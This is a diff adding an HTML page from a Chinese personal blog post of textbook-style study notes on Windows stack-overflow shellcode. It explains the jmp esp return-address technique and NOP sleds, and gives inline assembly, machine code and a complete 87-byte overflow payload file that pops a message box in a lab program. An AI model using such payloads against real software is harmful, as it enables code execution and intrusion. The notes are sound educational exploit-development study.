@@ -1,0 +1,1829 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>shellcode | Deutschball&#39;s blog</title>
+
+  <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/DeutschBall/test/master/emp.png">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://cdn.jsdelivr.net/gh/inkss/fontawesome@5.15.3/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
+  
+  
+    <script>
+        var themeModelId = '';
+        if (themeModelId) {
+            localStorage.setItem('modelId', themeModelId);
+        }
+    </script>
+    
+    <script src="https://cdn.jsdelivr.net/gh/yuang01/live2d-widget@latest/autoload.js"></script>
+    <script>
+        var live2dOpen = eval('true') || false;
+        if (!live2dOpen) {
+            localStorage.setItem('waifu-display', 1609323474481);
+        }
+    </script>
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/shareJs/share.min.css">
+
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+        <script src="/js/valine/av-min@3.0.4.js"></script>
+        <script src="https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js"></script>
+    
+
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head>
+
+  
+  <!-- 依赖于jquery和vue -->
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+
+  
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/vue@2.6.11/dist/vue.min.js"></script>
+
+  
+  
+  <body>
+    <!-- 预加载动画 -->
+    <!-- 页面预加载动画 -->
+
+<div id='loader'>
+  <link rel="stylesheet" href="/js/loaded/index.css" >
+  <div class="loading-left-bg"></div>
+  <div class="loading-right-bg"></div>
+  <div class="spinner-box">
+    <div class="configure-border-1">
+      <div class="configure-core"></div>
+    </div>
+    <div class="configure-border-2">
+      <div class="configure-core"></div>
+    </div>
+    <div class="loading-word">loading...</div>
+  </div>
+</div>
+
+<script>
+  var endLoading = function () {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('DOMContentLoaded',endLoading);
+  
+</script>
+
+    
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('true');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (href, before, media, attributes) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header   " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo lazyload placeholder" src="https://raw.githubusercontent.com/DeutschBall/test/master/emp.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/test/master/emp.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="logo">
+      <h3 class="drawer-box-head_title">Deutschball&#39;s blog</h3>
+      <h5 class="drawer-box-head_desc"></h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+        
+          <li class="drawer-box-content_item">
+            <a target="_blank" rel="noopener" href="https://github.com/DeutschBall">
+              <i class="fas fa-github" aria-hidden="true"></i>
+              <span>Github</span>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="https://raw.githubusercontent.com/DeutschBall/test/master/emp.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/test/master/emp.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">Deutschball&#39;s blog</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">Search</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="Please enter keywords"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
+
+    </nav>
+  </div>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/DeutschBall" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  
+  
+</header>
+        <!-- 内容区域 -->
+        
+ <!-- prismjs 代码高亮 -->
+ 
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('/medias/14.jpg')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        shellcode
+      </span>
+    </div>
+    
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> Published in：2022-09-17 |
+        </span>
+      
+
+      
+
+      
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="row justify-position" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><h2 id="jmp-esp"><a href="#jmp-esp" class="headerlink" title="jmp esp"></a>jmp esp</h2><p>在第二章的实验中,跳转执行堆栈中的shellcode时,使用的是绝对地址,只要是换个系统,可能就不是这个地址了.user32在不同的平台上,映像基址也不同,MessageBoxA函数的地址也不同.</p>
+<p>也就是说第二章的代码只适用于很小范围的操作系统环境.现在要开发老少通吃的shellcode代码.</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917091036012.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917091036012.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="由于动态链接库的装载,函数栈帧可能每次运行都不同"></p>
+<p>但是有一点可以确定的是,esp栈顶指针总会在一个函数retn之前退回到函数一开始时的状态</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:00401090;开端</span><br><span class="line">.text:00401090                 push    ebp;这个push和最后的pop也是相对应的</span><br><span class="line">.text:00401091                 mov     ebp, esp</span><br><span class="line">.text:00401093                 sub     esp, 448h;扩大448个字节</span><br><span class="line">....;正文部分</span><br><span class="line">;尾声</span><br><span class="line">.text:00401152                 add     esp, 448h;退栈448h个字节</span><br><span class="line">.text:00401158                 cmp     ebp, esp</span><br><span class="line">.text:0040115A                 call    __chkesp</span><br><span class="line">.text:0040115F                 mov     esp, ebp</span><br><span class="line">.text:00401161                 pop     ebp</span><br><span class="line">.text:00401162                 retn</span><br><span class="line">.text:00401162 _main_0         endp ; sp-analysis failed</span><br></pre></td></tr></table></figure>
+<p>retn之后,esp退回到调用之前的状态,即调用者已经将参数压栈准备好的状态,接下来调用者就得清理参数了</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917092022180.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917092022180.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917092022180"></p>
+<p>根据这一点,可以将shellcode溢出到被调用者栈帧,调用者ebp,返回地址,参数,调用者栈帧</p>
+<p>其中返回地址之后的(被调用者栈帧,调用者ebp)随便填充</p>
+<p>返回地址可以找一条<code>jmp esp</code>的地址放上</p>
+<p>shellcode写到返回地址之前的参数,甚至调用者栈帧里</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917092903771.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917092903771.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917092903771"></p>
+<p>之后eip顺势执行返回地址之前的shellcode</p>
+<p>现在的问题是,从哪里找jmp esp,显然要从一个万年不变的地方,相对来说,user32.dll,kernel32.dll这种动态库就是个好地方</p>
+<p>正常情况下,系统的dll的代码段是找不到jmp esp这种脑残一样的指令的,既要堆栈不可执行,又要控制跳转到堆栈,属于是既要当婊子,又要立牌坊了.</p>
+<p>但是jmp esp本质上就是0xFFE4这么一个机器码,从海量的dll库中,随便挑一个地方查0xFFE4这么一串数字,不是没有存在的可能</p>
+<p>用ida打开user32.dll,Ctrl+B查找字节序列0xFFE4,能找到很多这种序列,比如</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917103921056.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917103921056.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="一定要注意字节序"></p>
+<p>一定要注意字节序,一定要注意字节序,一定要注意字节序,一定要注意字节序,一定要注意字节序</p>
+<p>为了让程序弹窗之后能够正常退出,需要调用exit(0)函数,这个函数在kernel32.dll中,可以用dependency walker查其位置</p>
+<p>Kernel32.dll映像基址0x77E40000,</p>
+<p>ExitProcess函数的RVA=0x00015CB5</p>
+<p>则VA(ExitProcess)=RVA(ExitProcess)+ImageBase(Kernel32.dll)=0x77E55CB5</p>
+<p>为了将shellcode从汇编指令转化为机器码,可以使用内联汇编<code>_asm&#123;&#125;</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HINSTANCE LibHandle;</span><br><span class="line">	<span class="type">char</span> dllbuf[<span class="number">11</span>] = <span class="string">&quot;user32.dll&quot;</span>;</span><br><span class="line">	LibHandle = LoadLibrary(dllbuf);</span><br><span class="line">	_asm &#123; </span><br><span class="line"> 		sub sp,<span class="number">0x440</span></span><br><span class="line"> 		xor ebx,ebx</span><br><span class="line"> 		push ebx <span class="comment">// cut string</span></span><br><span class="line"> 		push <span class="number">0x74736577</span></span><br><span class="line"> 		push <span class="number">0x6C696166</span> <span class="comment">// push failwest</span></span><br><span class="line"> 		mov eax,esp <span class="comment">// load address of failwest</span></span><br><span class="line"> 		push ebx</span><br><span class="line"> 		push eax</span><br><span class="line"> 		push eax</span><br><span class="line"> 		push ebx</span><br><span class="line"> 		mov eax,<span class="number">0x77D3ADD7</span> <span class="comment">// address should be reset in different OS</span></span><br><span class="line"> 		call eax <span class="comment">// call MessageboxA</span></span><br><span class="line">  		push ebx</span><br><span class="line"> 		mov eax,<span class="number">0x77E55CB5</span></span><br><span class="line"> 		call eax <span class="comment">// call exit(0)</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译链接之后用010editor打开,在.text节找到内联的汇编代码</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917101452302.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917101452302.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917101452302"></p>
+<p>对应的机器码为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">66 81 EC 40 04 33 DB 53 68 77 65 73 74 68 66 61</span><br><span class="line">69 6C 8B C4 53 50 50 53 B8 D7 AD D3 77 FF D0</span><br></pre></td></tr></table></figure>
+<p>这是31个字节</p>
+<p>从buffer到返回地址家门口一共是52个字节,随便用52个’A’填充即可</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917003031600.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917003031600.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917003031600"></p>
+<p>然后返回地址用0x77D4754A覆盖</p>
+<p>然后加上31个字节的shellcode,就得到了完整的exploit,共52+4+31=87字节</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917104046117.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917104046117.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917104046117"></p>
+<p>放到windows虚拟机上跑一下</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917104142074.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917104142074.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="pwn!"></p>
+<p>通了</p>
+<p>但是点击确定之后还是会报错</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917104550420.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917104550420.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917104550420"></p>
+<p>eip=0x12FB49的时候发生的错误,错误代码0x80000003,意思是遭遇到中断了</p>
+<p>下面调试一下看看发生了什么</p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><h4 id="strcmp拷贝password到buffer之后"><a href="#strcmp拷贝password到buffer之后" class="headerlink" title="strcmp拷贝password到buffer之后"></a>strcmp拷贝password到buffer之后</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917105035975.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917105035975.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917105035975"></p>
+<h4 id="retn之后"><a href="#retn之后" class="headerlink" title="retn之后"></a>retn之后</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917105128605.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917105128605.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917105128605"></p>
+<p>控制已经转移到user32.dll中,0x77D4754A位置,将要执行jmp esp,而此时esp=0x12FB28</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917105257574.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917105257574.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="0x12FB28"></p>
+<p>此处正是溢出放置的shellcode</p>
+<h4 id="jmp-esp之后"><a href="#jmp-esp之后" class="headerlink" title="jmp esp之后"></a>jmp esp之后</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917105357095.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917105357095.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917105357095"></p>
+<p>控制已经转移到0x12F828</p>
+<p>call eax之后,竟然是一个add ah,cl,然后紧跟着就是一大片int 3中断指令,不是预期的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax,<span class="number">0x77E55CB5</span></span><br><span class="line">call eax <span class="comment">// call exit(0)</span></span><br></pre></td></tr></table></figure>
+<p>在执行完add ah,cl之后,控制到达0x12FB49位置,这时候程序就会报告0x80000003号错误了</p>
+<p>检查了一圈发现原来是忘记拷贝这两条指令的机器码了,绷不住了</p>
+<p>改正后的password.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 4A 75 D4 77 66 81 EC 40 04 33 DB 53</span><br><span class="line">68 77 65 73 74 68 66 61 69 6C 8B C4 53 50 50 53</span><br><span class="line">B8 D7 AD D3 77 FF D0 53 B8 B5 5C E5 77 FF D0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>用这个password.txt作为负载就打通了,并且程序能够全身而退不报错</p>
+<h2 id="扩大靶面积"><a href="#扩大靶面积" class="headerlink" title="扩大靶面积"></a>扩大靶面积</h2><h3 id="shellcode放在那里"><a href="#shellcode放在那里" class="headerlink" title="shellcode放在那里?"></a>shellcode放在那里?</h3><p>第二章将shellcode直接写入buffer中,有被再次长起来的堆栈覆盖的风险</p>
+<p>本章的方法直接将shellcode藏到ESP的头上,ESP只会向下长,就不用担心shellcode被覆盖了</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917111521845.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917111521845.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917111521845"></p>
+<p>如果buffer足够大,远远不用担心堆栈长起来复仇,则可以使用2.4的方法.</p>
+<p>2.4的方法相对于3.2的方法,其好处是溢出只发生于被调用者栈帧,shellcode执行完之后比较容易归还控制,还原寄存器</p>
+<p>但是3.2的实验,往调用者栈帧溢出,就不容易归还控制和寄存器了</p>
+<p>但是2.4的缺点是,溢出返回地址时使用的是堆栈的绝对地址,而不同操作系统上可能堆栈位置会发生变化,因此适用性差</p>
+<h3 id="折中方案"><a href="#折中方案" class="headerlink" title="折中方案"></a>折中方案</h3><p>有一个集合两个方法有点的方法,</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917112905475.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917112905475.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917112905475"></p>
+<p>啥意思呢?</p>
+<p>将返回地址还是溢出成一条jmp esp的地址,但是紧跟在返回地址之前,也就是返回后esp指向的地址,不直接放shellcode,而是放一条相对跳转.跳回到”被调用者栈帧”(加引号是因为返回后被调用者栈帧已经扬了,只不过原来写到上面的东西都还没擦)</p>
+<p>而shellcode早已放在被调用者栈帧的buffer中了</p>
+<p>这种方法还是有shellcode被再次长起来的堆栈覆盖的风险</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917113049128.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917113049128.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917113049128"></p>
+<h3 id="预防堆栈覆盖shellcode"><a href="#预防堆栈覆盖shellcode" class="headerlink" title="预防堆栈覆盖shellcode"></a>预防堆栈覆盖shellcode</h3><p>但是有对策,在shellcode一开始先让栈顶下降到shellcode以下,保证堆栈再怎么长都和shellcode无关</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917113652524.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917113652524.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917113652524"></p>
+<h3 id="x是多少-扩大靶面积"><a href="#x是多少-扩大靶面积" class="headerlink" title="x是多少?扩大靶面积"></a>x是多少?扩大靶面积</h3><p>还有一个问题,x是多少呢?</p>
+<p>buffer与retn之后的esp的距离,一定就是常数x吗?</p>
+<p>也不一定,考虑对齐,优化各种因素,x可能会变</p>
+<p>那么怎么准确的让jmp esp-x这条指令能够跳转到shellcode中呢?</p>
+<p>如果buffer足够大,可以在其一开始填充很多nop(0x90)指令,啥也不干,但是eip会向高地址端移动</p>
